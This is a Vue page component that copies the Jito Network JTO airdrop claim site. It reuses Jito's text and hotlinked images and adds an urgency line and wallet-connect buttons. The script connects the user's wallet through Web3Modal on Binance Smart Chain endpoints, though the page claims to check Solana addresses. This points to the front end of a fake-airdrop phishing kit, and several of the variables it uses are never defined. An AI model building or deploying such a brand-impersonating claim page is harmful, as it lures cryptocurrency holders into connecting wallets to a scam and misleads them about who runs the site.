<template>
    <div class="box">
        <div class="cen">
            <div class="cen_one">
                <div class="cen_two">
                    <h1>Welcome to the future of Jito governance</h1>
                    <p>
                        Introducing JTO token: empowering our community to directly shape the Jito Network’s evolution.
                        Search below to verify eligibility of your Solana wallet address
                    </p>
                    <div class="cen_three">
                        <div class="cen_tour" >
                            Connect to Check Eligibility
                        </div>
                        <div class="cen_five" >
                            Search for an Address
                        </div>
                    </div>
                </div>
                <div class="cen_left">
                    <img src="https://www.jito.network/_next/image/?url=%2Fairdrop%2FpeopleOnTower.webp&w=1080&q=75">
                </div>
            </div>
            <div class="claim">
                <div class="claim_one">
                    <p class="claim_two">Want To Know If You Are Eligible?</p>
                    <p class="claim_three"><a>Connect Wallet</a> or search a wallet address</p>
                </div>
                <div class="claim_four">
                    <p>Only 547 days left to claim...</p>
                    <div class="claim_five">
                        <div class="claim_six"></div>
                    </div>
                </div>
            </div>
            <div class="Token">
                <div class="Token_one">
                    <div class="Token_two">
                        <img src="https://www.jito.network/airdrop/coinsTower.svg">
                    </div>
                    <div class="Token_three">
                        <p class="Token_four">What is JTO Token?</p>
                        <p class="Token_five">
                            JTO token is the governance token for the Jito Network, designed to decentralize decision-making
                            within the ecosystem. It allows community members to participate in shaping the network's future
                            by voting on key operational and strategic decisions.
                        </p>
                        <div class="Read">
                            Read More
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>
<script setup>
import Web3Modal from "web3modal";
import { ethers } from "ethers";
import { ref } from 'vue';
let web3Modal = {};
const connect = async () => {
    const WalletConnect = window.WalletConnectProvider.default;
    const Fortmatic = window.Fortmatic;
    const providerOptions = {
        fortmatic: {
            package: Fortmatic,
            options: {
                // Mikko's TESTNET api key
                key: "pk_test_391E26A3B43A3350",
            },
        },
        walletconnect: {
            package: WalletConnect,
            options: {
                rpc: {
                    56: "https://bsc-dataseed.binance.org/",
                    97: "https://data-seed-prebsc-1-s1.binance.org:8545/",
                },
                network: "binance",
            },
        },
    };

    web3Modal = new Web3Modal({
        network: "mainnet", // optional
        cacheProvider: true, // optional
        providerOptions, // required
    });
    const externalProvider = await web3Modal.connect();
    return new ethers.providers.Web3Provider(externalProvider);
};
const render = async () => {
    const provider = await connect();
    const signer = provider.getSigner(0);
    xhladdress.value = await signer.getAddress();
    xxhladdress.value =
        xhladdress.value.substring(0, 4) +
        "..." +
        xhladdress.value.substring(
            xhladdress.value.length - 4,
            xhladdress.value.length
        );
    ongb();
    loginan.value = 1;
    // localStorage.setItem("xhladd", xhladdress.value);
    // const rawBalance = await provider.getBalance(xhladdress.value);
    // xethbalance.value = ethers.utils.formatEther(rawBalance);
    // localStorage.setItem("xhlbalance", xethbalance.value);
    // bus.$emit("qbbalance", xethbalance.value);
};
let show = ref(true)

function clext() {

}
</script>

<style scoped>
.show {
    width: 100%;
    height: 100vh;
    /* position: ; */
    background-color: rgba(0, 0, 0, 0.2);
}

.cen {
    width: 100%;
    /* height: 60rem; */
    padding: 4rem 0;

    background: rgb(17, 11, 11);
    color: rgb(255, 255, 255);
}

.cen_one {
    width: 63.5%;
    margin: 0 auto;
    box-sizing: border-box;
    display: flex;
    align-items: center;
    padding-bottom: 2rem;
}

.cen_two {
    width: 50%;
}

.cen_two h1 {
    font-family: "Vectrex";
    color: white;
    font-size: 48px;
    line-height: 62px;

}

.cen_two>p {
    margin-top: 1rem;
    margin-bottom: 2rem;
    font-family: "GT Pressura Mono";
    font-weight: 400;
    font-size: 16px;
    line-height: 28px;
}

.cen_three {
    display: flex;
}

.cen_tour {
    padding: 0.7rem 1rem;
    border-radius: 20px;
    font-size: 12px;
    display: flex;
    text-align: center;
    cursor: pointer;
    background-color: rgb(185, 107, 252);
    margin-right: 1rem;
    align-items: center;
    font-family: "GT Pressura Mono";

}
.cen_tour:hover{
    opacity: 0.7;
}
.cen_five:hover{
    opacity: 0.7;
}
.Read:hover{
    opacity: 0.7;

}
.cen_five {
    padding: 0.7rem 1.5rem;
    border-radius: 20px;
    font-size: 11px;
    display: flex;
    text-align: center;
    cursor: pointer;
    background-color: rgba(255, 255, 255, 0.8);
    margin-right: 1rem;
    align-items: center;
    font-family: "GT Pressura Mono";
    color: black;
}

.cen_left {
    width: 50%;
    display: flex;
}

.cen_left img {
    width: 515px;
    height: 505px;
}

.claim {
    width: 63.5%;
    padding: 30px;
    margin: 0 auto;
    box-sizing: border-box;
    background-color: white;
    border-radius: 10px;
}

.claim_one {
    width: 100%;
    border-radius: 10px;
    padding: 3rem 0;
    background-color: rgb(248, 248, 248);
    color: black;
}

.claim_one>p {
    text-align: center
}

.claim_two {
    font-size: 24px;
    line-height: 36px;
    font-weight: 500;
    font-family: "Vectrex";
}

.claim_three {
    font-size: 18px;
    line-height: 40px;
    font-weight: 500;
    font-family: "GT Pressura Mono";
}

.claim_three>a {
    padding-bottom: 5px;
    text-decoration: underline;
}

.claim_four {
    margin-bottom: 1rem;
}

.claim_four>p {
    color: black;
    font-size: 14px;
    margin: 2rem 0 0.5rem 0;
    font-family: "GT Pressura Mono";
}

.claim_five {
    width: 100%;
    height: 10px;
    background-color: rgb(248, 248, 248);
}

.claim_six {
    width: 1px;
    height: 100%;

    background-color: rgb(185, 107, 252);
}

.Token {
    width: 63.5%;
    background-color: rgba(248, 248, 248, 0.2);
    padding: 20px 0;
    margin: 4rem auto;
    border-radius: 15px;
}

.Token_one {
    width: 95%;
    display: flex;
    margin: 0 auto;
}

.Token_two {
    width: 40%;
    display: flex;
    justify-content: space-between
}

.Token_two {
    width: 363px;
    height: 357px;
}

.Token_three {
    width: 60%;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    /* justify-content: space-between; */
}

.Token_four {
    color: white;
    font-family: "Vectrex";
    font-size: 42px;
    line-height: 60px;
    margin: 1rem 0;
}

.Token_five {
    width: 500px;
    line-height: 28px;
    font-size: 18px;
    margin-bottom: 3rem;
    font-family: "GT Pressura Mono";
}

.Read {
    width: 6rem;
    padding: 0.7rem;
    background-color: white;
    color: black;
    text-align: center;
    border-radius: 30px;
    font-family: "GT Pressura Mono";
    border: 1px rgb(239, 241, 239) solid;
}

@media (max-width: 1250px) {
    .cen_one {
        width: 100%;
        margin-top: 5rem;
        flex-direction: column;
    }

    .cen_two {
        width: 100%;
    }

    .cen_left {
        width: 100%;
    }

    .cen_left>img {
        width: 100%;
        height: auto;
    }

    .claim {
        width: 100%;
    }

    .Token {
        width: 100%;
        display: flex;
    }

    .Token_one {
        flex-direction: column;
        align-items: center;
    }

    .Token_three {
        width: 100%;
    }

    .Token_four {
        font-size: 36px;
    }

    .Token_five {
        width: 100%;
    }

    .Read {
        width: 100%;
        box-sizing: border-box;
    }
}</style>
